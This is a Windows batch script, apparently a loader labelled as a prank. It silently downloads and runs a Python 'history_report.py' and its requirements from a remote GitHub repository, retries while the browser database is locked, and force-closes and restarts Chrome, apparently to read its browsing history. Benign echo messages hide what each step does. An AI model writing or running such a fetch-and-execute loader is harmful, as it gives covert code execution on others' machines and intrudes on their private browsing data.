@echo off
echo Starting process...

:: Check if the history folder exists
if exist "%APPDATA%\history" (
    echo History folder exists. Deleting the old history folder...
    rmdir /s /q "%APPDATA%\history"
)

:: Create the history folder again
mkdir "%APPDATA%\history"

:: Navigate to the folder
cd "%APPDATA%\history"

:: Check if 'requirements.txt' exists and download if necessary
if not exist "requirements.txt" (
    echo Downloading 'requirements.txt'...
    powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/requirements.txt' -OutFile 'requirements.txt'"
)

:: Install necessary Python packages silently
echo Installing required libraries...
pip install --quiet --user -r requirements.txt

:: Check if the Python script exists and download if necessary
if not exist "history_report.py" (
    echo Downloading the Python script...
    powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/history_report.py' -OutFile 'history_report.py'"
)

:: Retry logic for checking if the database is locked
set retries=0
set max_retries=5
:retry
echo Checking if the database is locked...
python "%APPDATA%\history\history_report.py"
if %ERRORLEVEL% equ 0 (
    echo Database is not locked. Continuing...
    goto run_script
) else (
    set /a retries+=1
    if %retries% lss %max_retries% (
        echo Database is locked, retrying... (%retries%/%max_retries%)
        timeout /t 5 /nobreak
        goto retry
    ) else (
        echo Max retries reached. Exiting...
        exit /b
    )
)

:run_script
:: Wait 3 seconds before reopening Google
timeout /t 3 /nobreak

:: Check if Chrome is running and close it
tasklist /fi "imagename eq chrome.exe" 2>nul | find /i "chrome.exe" >nul
if not errorlevel 1 (
    echo Closing Chrome...
    taskkill /f /im chrome.exe
) else (
    echo Chrome is not running.
)

:: Reopen Google Chrome
echo Reopening Chrome...
start chrome.exe

echo Process complete!
pause
